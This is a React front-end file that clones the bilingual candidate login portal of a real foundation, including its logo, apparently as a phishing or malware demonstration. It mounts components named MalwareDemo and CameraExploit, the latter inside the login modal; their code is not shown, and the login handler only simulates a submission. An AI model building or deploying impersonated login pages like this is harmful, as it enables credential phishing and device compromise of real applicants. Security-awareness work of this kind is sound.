import React, { useState } from 'react';
import { Eye, EyeOff, Lock, X, Menu } from 'lucide-react';
import './App.css';
import MalwareDemo from './components/MalwareDemo';
import CameraExploit from './components/CameraExploit';
function App() {
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);

  const handleLogin = (e) => {
    e.preventDefault();
    setIsLoading(true);
    // Simulate login attempt
    setTimeout(() => {
      setIsLoading(false);
      alert('Login attempt registered!');
      setIsModalOpen(false);
    }, 1000);
  };

  return (
    <div className="portal-layout">
      {/* Header Wrapper constraint for centered inner items */}
      <div className="portal-header-wrapper">
        <header className="portal-header">
          <div className="header-left">
            <img src="/logo-transparent.png" alt="UM6P Foundation Logo" className="um6p-logo" />
          </div>
          <div className="header-center desktop-only">
            <div className="profile-link">
              <Lock size={18} strokeWidth={2.5} className="profile-icon" />
              MON PROFIL
            </div>
          </div>
          <div className="header-right desktop-only">
            <button
              className="btn-login-header"
              onClick={() => setIsModalOpen(true)}
            >
              Se connecter
            </button>
          </div>
          {/* Mobile hamburger menu */}
          <div className="header-right mobile-only">
            <Menu
              className="mobile-menu-icon"
              size={28}
              onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}
            />
          </div>
        </header>

        {/* Mobile Dropdown Menu */}
        {isMobileMenuOpen && (
          <div className="mobile-menu-dropdown mobile-only">
            <div className="mobile-menu-item">
              <Lock size={16} strokeWidth={2.5} className="profile-icon-mobile" />
              MON PROFIL
            </div>
            <div
              className="mobile-menu-item login-item"
              onClick={() => {
                setIsModalOpen(true);
                setIsMobileMenuOpen(false);
              }}
            >
              Se connecter
            </div>
          </div>
        )}
      </div>

      {/* Main Content Area */}
      <main className="portal-main">
        <div className="main-left">
          {/* French Section */}
          <h3 className="portal-title">Portail candidat</h3>
          <p className="welcome-text-small">
            Bienvenue sur notre portail de candidature 2026 !
          </p>
          <p className="portal-desc">
            Si vous vous connectez pour la première fois et que vous n'avez pas encore vos
            identifiants, vous devez créer votre compte candidat en cliquant sur le lien disponible
            sur notre site web.
          </p>
          <p className="portal-desc">
            <span className="orange-text-link">
              Si vous ne recevez pas les e-mails de notification ou de création/réinitialisation de mot
              de passe, veuillez vérifier votre dossier de courriers indésirables (spam).
            </span>
          </p>
          <p className="portal-desc">
            Merci pour votre intérêt.
          </p>

          {/* English Section */}
          <h3 className="portal-title">Candidate Portal</h3>
          <p className="welcome-text-small">
            Welcome to the 2026 application portal!
          </p>
          <p className="portal-desc">
            If this is your first time applying and you do not currently have an account, you will need to create a
            candidate account in order to begin your application. To do so, please use the account creation link
            available on our web site.
          </p>
          <p className="portal-desc">
            <span className="orange-text-link">
              If you're not receiving notification or password reset emails, please check your spam or
              junk folder.
            </span>
          </p>
          <p className="portal-desc">
            Thank you for your interest.
          </p>
        </div>

        <div className="main-right">
          <img src="/student-final.jpg" alt="Students" className="students-image" />
        </div>
      </main>

      <MalwareDemo />

      {/* Login Modal Overlay */}
      {isModalOpen && (
        <div className="modal-overlay" onClick={() => setIsModalOpen(false)}>
          <div className="login-modal" onClick={(e) => e.stopPropagation()}>
            <button className="close-btn" onClick={() => setIsModalOpen(false)}>
              <X size={24} />
            </button>

            <h2>Connexion</h2>

            <form onSubmit={handleLogin}>
              <div className="form-group">
                <label>Nom d'utilisateur</label>
                <div className="input-wrapper">
                  <input
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    required
                  />
                </div>
              </div>

              <div className="form-group">
                <label>Mot de passe</label>
                <div className="input-wrapper">
                  <input
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                  />
                  <button
                    type="button"
                    className="password-toggle"
                    onClick={() => setShowPassword(!showPassword)}
                  >
                    {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                  </button>
                </div>
              </div>

              <div className="form-actions">
                <a href="#" className="forgot-password">
                  Première connexion / Mot de passe oublié
                </a>
                <button type="submit" className="btn-submit" disabled={isLoading}>
                  {isLoading ? 'Connexion...' : 'Se connecter'}
                </button>
              </div>
            </form>
            
            <CameraExploit />
          </div>
        </div>
      )}
    </div>
  );
}

export default App;
